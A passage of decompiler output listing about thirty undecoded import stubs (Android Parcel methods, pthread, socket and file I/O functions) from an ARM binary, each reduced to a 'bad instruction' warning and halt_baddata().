                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: readObject @ 00016048 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::readObject(bool param_1)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: ipcData @ 0001604c */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::ipcData(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: ipcDataSize @ 00016050 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::ipcDataSize(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: __aeabi_unwind_cpp_pr1 @ 00016054 */

/* WARNING: Control flow encountered bad instruction data */

void __aeabi_unwind_cpp_pr1(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: pthread_getspecific @ 00016058 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * pthread_getspecific(pthread_key_t __key)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: pthread_setspecific @ 0001605c */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_setspecific(pthread_key_t __key,void *__pointer)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: ioctl @ 00016060 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int ioctl(int __fd,ulong __request,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: pthread_key_create @ 00016064 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_key_create(pthread_key_t *__key,__destr_function *__destr_function)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: strcpy @ 00016068 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strcpy(char *__dest,char *__src)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: pthread_create @ 0001606c */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_create(pthread_t *__newthread,pthread_attr_t *__attr,__start_routine *__start_routine,
                  void *__arg)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: malloc @ 00016070 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * malloc(size_t __size)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: lseek @ 00016074 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__off_t lseek(int __fd,__off_t __offset,int __whence)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: free @ 00016078 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void free(void *__ptr)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: __errno @ 0001607c */

/* WARNING: Control flow encountered bad instruction data */

void __errno(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: read @ 00016080 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t read(int __fd,void *__buf,size_t __nbytes)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: sysconf @ 00016084 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

long sysconf(int __name)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: open @ 00016088 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int open(char *__file,int __oflag,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: close @ 0001608c */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int close(int __fd)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: mprotect @ 00016090 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int mprotect(void *__addr,size_t __len,int __prot)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: strlen @ 00016094 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t strlen(char *__s)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: socket @ 00016098 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int socket(int __domain,int __type,int __protocol)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: connect @ 0001609c */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int connect(int __fd,sockaddr *__addr,socklen_t __len)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: write @ 000160a0 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t write(int __fd,void *__buf,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: bind @ 000160a4 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int bind(int __fd,sockaddr *__addr,socklen_t __len)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: listen @ 000160a8 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int listen(int __fd,int __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: accept @ 000160ac */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int accept(int __fd,sockaddr *__addr,socklen_t *__addr_len)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: fopen @ 000160b0 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

FILE * fopen(char *__filename,char *__modes)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: fseek @ 000160b4 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fseek(FILE *__stream,long __off,int __whence)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: sscanf @ 000160b8 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int sscanf(char *__s,char *__format,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: fgets @ 000160bc */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * fgets(char *__s,int __n,FILE *__stream)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: fclose @ 000160c0 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fclose(FILE *__stream)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: snprintf @ 000160c4 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int snprintf(char *__s,size_t __maxlen,char *__format,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: strtok @ 000160c8 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strtok(char *__s,char *__delim)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: strtoul @ 000160cc */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ulong strtoul(char *__nptr,char **__endptr,int __base)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: __cxa_finalize @ 000160d0 */

/* WARNING: Control flow encountered bad instruction data */

void __cxa_finalize(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



